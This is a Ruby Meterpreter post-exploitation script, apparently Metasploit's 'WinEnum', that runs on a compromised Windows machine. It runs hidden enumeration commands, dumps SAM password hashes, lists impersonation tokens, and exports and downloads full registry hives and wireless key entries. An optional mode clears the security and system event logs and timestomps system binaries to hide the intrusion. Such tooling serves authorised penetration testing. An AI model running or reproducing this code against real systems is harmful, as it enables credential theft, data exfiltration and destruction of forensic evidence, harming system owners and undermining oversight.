# $Id$

################## Variable Declarations ##################
@client = client
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-m" => [ false, "Migrate the Meterpreter Session from it current process to a new cmd.exe before doing anything" ],
	"-r" => [ false, "Dump, compress and download entire Registry" ],
	"-c" => [ false, "Change Access, Modified and Created times of executables that were run on the target machine and clear the EventLog" ]
)

rd = nil
mg = nil
cm = nil
opts.parse(args) { |opt, idx, val|
	case opt
	when '-r'
		rd = 1
	when '-m'
		mg = 1
	when '-c'
		cm = 1
	when "-h"
		print_line "WinEnum -- Windows local enumeration"
		print_line
		print_line "Retrieves all kinds of information about the system"
		print_line "including environment variables, network interfaces,"
		print_line "routing, user accounts, and much more.  Results are"
		print_line "stored in #{::File.join(Msf::Config.log_directory, 'winenum')}"
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}

#-------------------------------------------------------------------------------

host,port = @client.tunnel_peer.split(':')
info = @client.sys.config.sysinfo
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'winenum', info['Computer'] + filenameinfo )
@logfol = logs
# Create the log directory
::FileUtils.mkdir_p(logs)

#log file name
@dest = logs + "/" + info['Computer'] + filenameinfo + ".txt"

# Commands that will be ran on the Target
commands = [
	'cmd.exe /c set',
	'arp -a',
	'ipconfig /all',
	'ipconfig /displaydns',
	'route print',
	'net view',
	'netstat -nao',
	'netstat -vb',
	'netstat -ns',
	'net accounts',
	'net accounts /domain',
	'net session',
	'net share',
	'net group',
	'net user',
	'net localgroup',
	'net localgroup administrators',
	'net group administrators',
	'net view /domain',
	'netsh firewall show config',
	'tasklist /svc',
	'tasklist /m',
	'gpresult /SCOPE COMPUTER /Z',
	'gpresult /SCOPE USER /Z'
]
# Windows 2008 Commands
win2k8cmd = [
	'servermanagercmd.exe -q',
	'cscript /nologo winrm get winrm/config',
]
# Commands that MACE will be changed
cmdstomp = [
	'cmd.exe',
	'reg.exe',
	'ipconfig.exe',
	'route.exe',
	'net.exe',
	'netstat.exe',
	'netsh.exe',
	'makecab.exe',
	'tasklist.exe',
	'wbem\\wmic.exe',
	'gpresult.exe'
]
# WMIC Commands that will be executed on the Target
wmic = [
	'useraccount list',
	'group list',
	'service list brief',
	'volume list brief',
	'logicaldisk get description,filesystem,name,size',
	'netlogin get name,lastlogon,badpasswordcount',
	'netclient list brief',
	'netuse get name,username,connectiontype,localname',
	'share get name,path',
	'nteventlog get path,filename,writeable',
	'process list brief',
	'startup list full',
	'rdtoggle list',
	'product get name,version',
	'qfe',
]
#Specific Commands for Windows vista for Wireless Enumeration
vstwlancmd = [
	'netsh wlan show interfaces',
	'netsh wlan show drivers',
	'netsh wlan show profiles',
	'netsh wlan show networks mode=bssid',
]
# Commands that are not present in Windows 2000
nonwin2kcmd = [
	'netsh firewall show config',
	'tasklist /svc',
	'gpresult /SCOPE COMPUTER /Z',
	'gpresult /SCOPE USER /Z',
	'prnport -l',
	'prnmngr -g',
	'tasklist.exe',
	'wbem\\wmic.exe',
	'netsh.exe',
]
# Executables not pressent in Windows 2000
nowin2kexe = [
	'netsh.exe',
	'gpresult.exe',
	'tasklist.exe',
	'wbem\\wmic.exe',
]
################## Function Declarations ##################
#Returns the data of a given registry key and value
def reg_getvaldata(key,valname)
	value = nil
	begin
		root_key, base_key = @client.sys.registry.splitkey(key)
		open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
		v = open_key.query_value(valname)
		value = v.data
		open_key.close
	end
	return value
end
#Enumerates the subkeys of a given registry key returns array of subkeys
def reg_enumkeys(key)
	subkeys = []
	begin
		root_key, base_key = @client.sys.registry.splitkey(key)
		open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
		keys = open_key.enum_key
		keys.each { |subkey|
			subkeys << subkey
		}
		open_key.close
	end
	return subkeys
end
def findprogs()
	print_status("Extracting software list from registry")
	proglist = ""
	threadnum = 0
	a =[]
	keyx86 = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall'
	reg_enumkeys(keyx86).each do |k|
		if threadnum < 10
			a.push(::Thread.new {
					begin
						dispnm = reg_getvaldata("#{keyx86}\\#{k}","DisplayName")
						dispversion = reg_getvaldata("#{keyx86}\\#{k}","DisplayVersion")
					rescue
					end
					proglist << "#{dispnm},#{dispversion}\n" if dispnm =~ /[a-z]/
				})
			threadnum += 1
		else
			sleep(0.05) and a.delete_if {|x| not x.alive?} while not a.empty?
			threadnum = 0
		end

	end
	filewrt("#{@logfol}/programs_list.csv",proglist)
end
# Function to check if Target Machine a VM
# Note: will add soon Hyper-v and Citrix Xen check.
def chkvm()
	check = nil
	vmout = ''
	info = @client.sys.config.sysinfo
	print_status "Checking if #{info['Computer']} is a Virtual Machine ........"

	# Check for Target Machines if running in VM, only fo VMware Workstation/Fusion
	begin
		key = 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS'
		root_key, base_key = @client.sys.registry.splitkey(key)
		open_key = @client.sys.registry.open_key(root_key,base_key,KEY_READ)
		v = open_key.query_value('SystemManufacturer')
		sysmnfg =  v.data.downcase
		if sysmnfg =~ /vmware/
			print_status "\tThis is a VMware Workstation/Fusion Virtual Machine"
			vmout << "This is a VMware Workstation/Fusion Virtual Machine\n\n"
			check = 1
		elsif sysmnfg =~ /xen/
			print_status("\tThis is a Xen Virtual Machine.")
			check = 1
		end
	rescue

	end
	if check != 1
		begin
			#Registry path using the HD and CD rom entries in the registry in case propirtary tools are
			#not installed.
			key2 = "HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"
			root_key2, base_key2 = @client.sys.registry.splitkey(key2)
			open_key2 = @client.sys.registry.open_key(root_key2,base_key2,KEY_READ)
			v2 = open_key2.query_value('Identifier')

			if v2.data.downcase =~ /vmware/
				print_status "\tThis is a VMWare virtual Machine"
				vmout << "This is a VMWare virtual Machine\n\n"
			elsif v2.data =~ /vbox/
				print_status "\tThis is a Sun VirtualBox virtual Machine"
				vmout << "This is a Sun VirtualBox virtual Machine\n\n"
			elsif v2.data.downcase =~ /xen/
				print_status "\tThis is a Xen virtual Machine"
				vmout << "This is a Xen virtual Machine\n\n"
			elsif v2.data.downcase =~ /virtual hd/
				print_status "\tThis is a Hyper-V/Virtual Server virtual Machine"
				vmout << "This is a Hyper-v/Virtual Server virtual Machine\n\n"
			end
		rescue::Exception => e
		end
	end
	vmout
end
#-------------------------------------------------------------------------------
# Function for running a list a commands stored in a array, return string
def list_exec(cmdlst)
	print_status("Running Command List ...")
	i = 0
	a =[]
	@client.response_timeout=120
	cmdlst.each do |cmd|
		if i < 10
			a.push(::Thread.new {
					r,cmdout='',""
					print_status "\trunning command #{cmd}"
					r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
					while(d = r.channel.read)
						cmdout << d
						filewrt("#{@logfol}/#{cmd.gsub(/(\W)/,"_")}.txt",cmdout)
					end
					cmdout = ""
					r.channel.close
					r.close
				})
			i += 1
			

		else
			sleep(0.10) and a.delete_if {|x| not x.alive?} while not a.empty?
			i = 0
		end
	end
	
	a.delete_if {|x| not x.alive?} while not a.empty?
end
#-------------------------------------------------------------------------------
# Function for running a list of WMIC commands stored in a array, returns string
def wmicexec(wmiccmds= nil)
	print_status("Running WMIC Commands ....")
	i, a = 0, []
	@client.response_timeout=120

	begin
		tmp = @client.fs.file.expand_path("%TEMP%")

		wmiccmds.each do |wmi|
			if i < 10
				a.push(::Thread.new {
						tmpout = ''
						wmicfl = tmp + "\\#{sprintf("%.5d",rand(100000))}.csv"
						print_status "\trunning command wmic #{wmi}"
						flname = "#{@logfol}/wmic_#{wmi.gsub(/(\W)/,"_")}.csv"
						r = @client.sys.process.execute("cmd.exe /c wmic /append:#{wmicfl} #{wmi} /format:csv", nil, {'Hidden' => true})
						sleep(2)						
						#Making sure that WMIC finishes before executing next WMIC command
						prog2check = "wmic.exe"
						found = 0
						while found == 0
							@client.sys.process.get_processes().each do |x|
								found =1
								if prog2check == (x['name'].downcase)
									sleep(0.5)
									found = 0
								end
							end
						end
						r.close
						# Read output of WMIC
						wmioutfile = @client.fs.file.new(wmicfl, "rb")
						until wmioutfile.eof?
							tmpout << wmioutfile.read
						end
						wmioutfile.close
						# Create file with output of command
						filewrt(flname,tmpout)
						# Delete created file on disk
						begin
							@client.fs.file.rm(wmicfl)
						rescue
						end

					})
				i += 1
			else
				sleep(0.01) and a.delete_if {|x| not x.alive?} while not a.empty?
				i = 0
			end
		end
		a.delete_if {|x| not x.alive?} while not a.empty?

	rescue ::Exception => e
		print_status("Error running WMIC commands: #{e.class} #{e}")
	end
end
#-------------------------------------------------------------------------------
#Function for getting the NTLM and LANMAN hashes out of a system
def gethash()
	print_status("Dumping password hashes...")
	begin
		hash = ''
		@client.core.use("priv")
		hashes = @client.priv.sam_hashes
		hashes.each do |h|
			hash << h.to_s+"\n"
		end
		hash << "\n\n\n"
		print_status("Hashes Dumped")
	rescue ::Exception => e
		print_status("\tError dumping hashes: #{e.class} #{e}")
		print_status("\tPayload may be running with insuficient privileges!")
	end
	flname = "#{@logfol}/hashdump.txt"
	filewrt(flname,hash)

end
#-------------------------------------------------------------------------------
#Function that uses the incognito features to list tokens on the system that can be used
def listtokens()
	begin
		print_status("Getting Tokens...")
		dt = ''
		@client.core.use("incognito")
		i = 0
		dt << "****************************\n"
		dt << "  List of Available Tokens\n"
		dt << "****************************\n\n"
		while i < 2
			tokens = @client.incognito.incognito_list_tokens(i)
			if i == 0
				tType = "User"
			else
				tType = "Group"
			end
			dt << "#{tType} Delegation Tokens Available \n"
			dt << "======================================== \n"

			tokens['delegation'].each_line{ |string|
				dt << string + "\n"
			}

			dt << "\n"
			dt << "#{tType} Impersonation Tokens Available \n"
			dt << "======================================== \n"

			tokens['impersonation'].each_line{ |string|
				dt << string + "\n"
			}
			i += 1
			break if i == 2
		end
		print_status("All tokens have been processed")
	rescue ::Exception => e
		print_status("Error Getting Tokens: #{e.class} #{e}")
	end
	filewrt("#{@logfol}/tokens.txt",dt)
end
#-------------------------------------------------------------------------------
# Function for clearing all event logs
def clrevtlgs()
	evtlogs = [
		'security',
		'system',
		'application',
		'directory service',
		'dns server',
		'file replication service'
	]
	print_status("Clearing Event Logs, this will leave and event 517")
	begin
		evtlogs.each do |evl|
			print_status("\tClearing the #{evl} Event Log")
			log = @client.sys.eventlog.open(evl)
			log.clear
			filewrt(@dest,"Cleared the #{evl} Event Log")
		end
		print_status("All Event Logs have been cleared")
	rescue ::Exception => e
		print_status("Error clearing Event Log: #{e.class} #{e}")

	end
end
#-------------------------------------------------------------------------------
# Function for Changing Access Time, Modified Time and Created Time of Files Supplied in an Array
# The files have to be in %WinDir%\System32 folder.
def chmace(cmds)
	windir = ''
	print_status("Changing Access Time, Modified Time and Created Time of Files Used")
	windir = @client.fs.file.expand_path("%WinDir%")
	cmds.each do |c|
		begin
			@client.core.use("priv")
			filetostomp = windir + "\\system32\\"+ c
			fl2clone = windir + "\\system32\\chkdsk.exe"
			print_status("\tChanging file MACE attributes on #{filetostomp}")
			@client.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
			filewrt(@dest,"Changed MACE of #{filetostomp}")
		rescue ::Exception => e
			print_status("Error changing MACE: #{e.class} #{e}")
		end
	end
end
#-------------------------------------------------------------------------------
#Dumping and Downloading the Registry of the target machine
def regdump(pathoflogs,filename)
	host,port = @client.tunnel_peer.split(':')
	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
	garbage = ''
	windrtmp = ''
	hives = %w{HKCU HKLM HKCC HKCR HKU}
	windir = @client.fs.file.expand_path("%WinDir%")
	print_status('Dumping and Downloading the Registry')
	hives.each_line do |hive|
		begin
			print_status("\tExporting #{hive}")
			r = @client.sys.process.execute("cmd.exe /c reg.exe export #{hive} #{windir}\\Temp\\#{hive}#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
			while(d = r.channel.read)
				garbage << d
			end
			r.channel.close
			r.close
			print_status("\tCompressing #{hive} into cab file for faster download")
			r = @client.sys.process.execute("cmd.exe /c makecab #{windir}\\Temp\\#{hive}#{filename}.reg #{windir}\\Temp\\#{hive}#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
			while(d = r.channel.read)
				garbage << d
			end
			r.channel.close
			r.close

		rescue ::Exception => e
			print_status("Error dumping Registry Hives #{e.class} #{e}")
		end
	end
	#Downloading compressed registry Hives
	hives.each_line do |hive|
		begin
			print_status("\tDownloading #{hive}#{filename}.cab to -> #{pathoflogs}/#{host}-#{hive}#{filename}.cab")
			@client.fs.file.download_file("#{pathoflogs}/#{host}-#{hive}#{filename}.cab", "#{windir}\\Temp\\#{hive}#{filename}.cab")
			filewrt(@dest,"Dumped and Downloaded #{hive} Registry Hive")
			sleep(5)
		rescue ::Exception => e
			print_status("Error Downloading Registry Hives #{e.class} #{e}")
		end
	end
	#Deleting left over files
	print_status("\tDeleting left over files")
	@client.sys.process.execute("cmd.exe /c del #{windir}\\Temp\\HK*", nil, {'Hidden' => 'true'})

end
#-------------------------------------------------------------------------------
# Function that will call 2 other Functions to cover all tracks
def covertracks(cmdstomp)
	clrevtlgs()
	info = @client.sys.config.sysinfo
	trgtos = info['OS']
	if trgtos =~ /(Windows 2000)/
		chmace(cmdstomp - nonwin2kcmd)
	else
		chmace(cmdstomp)
	end
end
#-------------------------------------------------------------------------------
# Function for writing results of other functions to a file
def filewrt(file2wrt, data2wrt)
	output = ::File.open(file2wrt, "a")
	if data2wrt
		data2wrt.each_line do |d|
			output.puts(d)
		end
	end
	output.close
end
#-------------------------------------------------------------------------------

# Function for dumping Registry keys that contain wireless configuration settings for Vista and XP 
# This keys can later be imported into a Windows client for connection or key extraction.
def dumpwlankeys(pathoflogs,filename)
	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
	garbage = ''
	windir = @client.fs.file.expand_path("%TEMP%")
	print_status('Dumping and Downloading the Registry entries for Configured Wireless Networks')
	xpwlan = "HKLM\\Software\\Microsoft\\WZCSVC\\Parameters\\Interfaces"
	vswlan = "HKLM\\Software\\Microsoft\\Wlansvc"
	info = @client.sys.config.sysinfo
	trgtos = info['OS']
	if trgtos =~ /(XP)/
		key = xpwlan
		present = false
		if reg_enumkeys("HKLM\\Software\\Microsoft\\WZCSVC\\Parameters").length == 0
			print_status("\tNo Wireless interfaces are configured on this host!")
			return
		end
	elsif trgtos =~ /(Vista|7)/
		key = vswlan
	end
	begin
		print_status("\tExporting #{key}")
		r = @client.sys.process.execute("reg export \"#{key}\" #{windir}\\wlan#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
		while(d = r.channel.read)
			garbage << d
		end
		sleep(2)
		r.channel.close
		r.close
		print_status("\tCompressing key into cab file for faster download")
		r = @client.sys.process.execute("cmd.exe /c makecab #{windir}\\wlan#{filename}.reg #{windir}\\wlan#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
		while(d = r.channel.read)
			garbage << d
		end
		r.channel.close
		r.close
	rescue ::Exception => e
		print_status("Error dumping Registry keys #{e.class} #{e}")
	end

	#Downloading compressed registry keys
	
	begin
		print_status("\tDownloading wlan#{filename}.cab to -> #{pathoflogs}/wlan#{filename}.cab")
		@client.fs.file.download_file("#{pathoflogs}/wlan#{filename}.cab", "#{windir}\\wlan#{filename}.cab")
		#sleep(5)
	rescue ::Exception => e
		print_status("Error Downloading Registry keys #{e.class} #{e}")
	end
	#Deleting left over files
	print_status("\tDeleting left over files")
	#@client.sys.process.execute("cmd.exe /c del #{windir}\\wlan*", nil, {'Hidden' => 'true'})

end
# Functions Provided by natron (natron 0x40 invisibledenizen 0x2E com)
# for Process Migration
#---------------------------------------------------------------------------------------------------------
def launchProc(target)
	print_status("Launching hidden #{target}...")

	# Set the vars; these can of course be modified if need be
	cmd_exec    = target
	cmd_args    = nil
	hidden      = true
	channelized = nil
	use_thread_token = false

	# Launch new process
	newproc = @client.sys.process.execute(cmd_exec, cmd_args,
		'Channelized' => channelized,
		'Hidden'      => hidden,
		'InMemory'    => nil,
		'UseThreadToken' => use_thread_token)

	print_status("Process #{newproc.pid} created.")

	return newproc
end
#-------------------------------------------------------------------------------
def migrateToProc(newproc)
	# Grab the current pid info
	server = @client.sys.process.open
	print_status("Current process is #{server.name} (#{server.pid}).  Migrating to #{newproc.pid}.")

	# Save the old process info so we can kill it after migration.
	oldproc = server.pid

	# Do the migration
	@client.core.migrate(newproc.pid.to_i)

	print_status("Migration completed successfully.")

	# Grab new process info
	server = @client.sys.process.open

	print_status("New server process: #{server.name} (#{server.pid})")

	return oldproc
end

#-------------------------------------------------------------------------------
def killApp(procpid)
	@client.sys.process.kill(procpid)
	print_status("Old process #{procpid} killed.")
end

#---------------------------------------------------------------------------------------------------------
# Function to execute process migration
def migrate()
	target = 'cmd.exe'
	newProcPid = launchProc(target)
	oldProc = migrateToProc(newProcPid)
	#killApp(oldProc)
	#Dangerous depending on the service exploited
end
#---------------------------------------------------------------------------------------------------------
#Function for Checking for UAC
def uaccheck()
	uac = false
	winversion = @client.sys.config.sysinfo
	if winversion['OS']=~ /(Vista|7)/
		if @client.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
			print_status("Checking if UAC is enabled ...")
			key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
			root_key, base_key = @client.sys.registry.splitkey(key)
			value = "EnableLUA"
			open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
			v = open_key.query_value(value)
			if v.data == 1
				print_status("\tUAC is Enabled")
				uac = true
			else
				print_status("\tUAC is Disabled")
			end
		end
	end
	filewrt(@dest,"UAC is Enabled")
	return uac
end
################## MAIN ##################

# Execute Functions selected
if (mg != nil)
	migrate()
end
# Main part of script, it will run all function minus the ones
# that will chance the MACE and Clear the Event log.
print_status("Running Windows Local Enumerion Meterpreter Script")
print_status("New session on #{host}:#{port}...")

# Header for File that will hold all the output of the commands
info = @client.sys.config.sysinfo
header =  "Date:       #{::Time.now.strftime("%Y-%m-%d.%H:%M:%S")}\n"
header << "Running as: #{@client.sys.config.getuid}\n"
header << "Host:       #{info['Computer']}\n"
header << "OS:         #{info['OS']}\n"
header << "\n\n\n"
print_status("Saving general report to #{@dest}")
print_status("Output of each individual command is saved to #{@logfol}")
filewrt(@dest,header)
filewrt(@dest,chkvm())
trgtos = info['OS']
uac = uaccheck()
# Run Commands according to OS some commands are not available on all versions of Windows
if trgtos =~ /(Windows XP)/
	if trgtos =~ /(2600, \)|2600, Service Pack 1\))/
		commands.delete('netstat -vb')
		commands.delete('netsh firewall show config')
	end
	list_exec(commands)
	wmicexec(wmic)
	findprogs()
	dumpwlankeys(logs,filenameinfo)
	gethash()
elsif trgtos =~ /(Windows .NET)/
	list_exec(commands)
	wmicexec(wmic)
	findprogs()
	gethash()
elsif trgtos =~ /(Windows 2008)/
	list_exec(commands + win2k8cmd)
	wmicexec(wmic)
	findprogs()
	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows 2008 if not System.")
	else
		gethash()
	end
elsif trgtos =~ /(Vista|7)/
	list_exec(commands + vstwlancmd)
	wmicexec(wmic)
	findprogs()
	if not uac
		dumpwlankeys(logs,filenameinfo)
	else
		print_status("UAC is enabled, Wireless key Registry could not be dumped under current privileges")
	end
	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista or Windows 7 if not System.")
	else
		gethash()
	end
elsif trgtos =~ /(Windows 2000)/
	list_exec(commands - nonwin2kcmd)
	gethash()
end

listtokens()
if (rd != nil)
	if not uac
		regdump(logs,filenameinfo)
	else
		print_status("UAC is enabled, Registry Keys could not be dumped under current privileges")
	end
end
if (cm != nil)
	if trgtos =~ /(Windows 2000)/
		covertracks(cmdstomp - nowin2kexe)
	else
		if not uac
			covertracks(cmdstomp)
		else
			print_status("UAC is enabled, Logs could not be cleared under current privileges")
		end
	end
end
print_status("Done!")
